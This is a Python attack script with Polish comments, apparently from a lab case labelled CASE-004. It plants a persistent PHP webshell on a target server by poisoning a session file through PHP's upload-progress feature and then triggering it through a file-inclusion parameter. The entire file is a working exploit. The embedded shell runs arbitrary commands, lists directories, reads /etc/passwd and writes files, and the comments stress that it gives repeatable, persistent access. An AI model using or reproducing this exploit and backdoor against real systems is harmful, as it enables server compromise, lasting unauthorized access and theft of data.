#!/usr/bin/env python3
"""
SESSION-BACKED WEBSHELL (CASE-004).

Roznica od reverse shella:
  - reverse shell: jedno polaczenie, ginie z procesem
  - webshell:      TRWALY - plik sesji zostaje na dysku (cleanup=Off),
                   kazdy request re-includuje payload = powtarzalny dostep

Interfejs (przez parametr 'a'):
  ?a=id                 - wykonaj komende
  ?a=ls&p=/etc          - listuj katalog
  ?a=read&p=/etc/passwd - czytaj plik
  ?a=write&p=/tmp/x&d=... - zapisz plik
  ?a=info               - phpinfo-like
  ?a=persist            - sprawdz czy payload zyje
"""
import http.client, secrets, sys, urllib.parse

WEBSHELL = r'''<?php
if(!isset($_GET['a'])){echo "SHELL_ALIVE";exit;}
$a=$_GET['a'];$p=$_GET['p']??'';$d=$_GET['d']??'';
switch($a){
case 'id': echo shell_exec('id'); break;
case 'cmd': echo shell_exec($p); break;
case 'ls':
  $dir=$p?:getcwd();
  foreach(@scandir($dir)?:[] as $f){
    $fp="$dir/$f";
    printf("%s\t%s\t%s\n", is_dir($fp)?'d':'-', @filesize($fp)?:'0', $f);
  } break;
case 'read': echo @file_get_contents($p)?:'ERR'; break;
case 'write': echo @file_put_contents($p,$d)!==false?'OK':"ERR"; break;
case 'info':
  printf("uid=%s gid=%s cwd=%s php=%s sapi=%s\n",
    @posix_getuid()?:'?', @posix_getgid()?:'?', getcwd(), PHP_VERSION, php_sapi_name());
  break;
case 'persist': echo "PAYLOAD_PERSISTED sid=".session_id(); break;
default: echo "UNKNOWN_ACTION";
}
?>'''

def poison(host, port, path, sid, payload):
    bnd = "----ws" + secrets.token_hex(3)
    body = (f'--{bnd}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f'{payload}\r\n'
            f'--{bnd}\r\nContent-Disposition: form-data; name="f"; filename="a.txt"\r\n'
            f'Content-Type: text/plain\r\n\r\n' + "A"*1024 + f'\r\n--{bnd}--\r\n').encode()
    c = http.client.HTTPConnection(host, port, timeout=20)
    c.request("POST", path, body=body, headers={
        "Content-Type": f"multipart/form-data; boundary={bnd}",
        "Cookie": f"PHPSESSID={sid}",
        "Content-Length": str(len(body))})
    r = c.getresponse(); r.read(); c.close()
    return r.status

def shell(host, port, path, param, sid, action, extra=None):
    q = {param: f"/tmp/sess/sess_{sid}", "a": action}
    if extra: q.update(extra)
    c = http.client.HTTPConnection(host, port, timeout=25)
    c.request("GET", f"{path}?{urllib.parse.urlencode(q)}",
              headers={"Cookie": f"PHPSESSID={sid}"})
    r = c.getresponse(); out = r.read().decode("utf-8", "replace"); c.close()
    return r.status, out

if __name__ == "__main__":
    if len(sys.argv) < 5:
        sys.exit("uzycie: session_webshell.py <host> <port> <path> <param> [sid]")
    host, port = sys.argv[1], int(sys.argv[2])
    path, param = sys.argv[3], sys.argv[4]
    sid = sys.argv[5] if len(sys.argv) > 5 else secrets.token_hex(16)

    print(f"[*] target: http://{host}:{port}{path}?{param}=<sess>&a=<action>")
    print(f"[*] sid   : {sid}")

    if len(sys.argv) <= 5:
        st = poison(host, port, path, sid, WEBSHELL)
        print(f"[1] poison     -> HTTP {st}")

    print("\n=== INTERFEJS WEBSHELLA ===")
    for action, extra, label in [
        ("persist", None, "payload zyje?"),
        ("info", None, "informacje o srodowisku"),
        ("ls", {"p": "/"}, "listowanie /"),
        ("cmd", {"p": "cat /etc/hostname"}, "czytanie hostname"),
        ("read", {"p": "/etc/passwd"}, "czytanie /etc/passwd"),
        ("write", {"p": "/tmp/ws_test.txt", "d": "WEBSHELL_WRITE_OK"}, "zapis pliku"),
        ("read", {"p": "/tmp/ws_test.txt"}, "odczyt zapisanego"),
    ]:
        st, out = shell(host, port, path, param, sid, action, extra)
        ok = out.strip() and "ERR" not in out[:20]
        print(f"\n[{action}] {label} -> HTTP {st} {'OK' if ok else 'FAIL'}")
        for line in out.strip().splitlines()[:6]:
            print(f"   {line[:110]}")
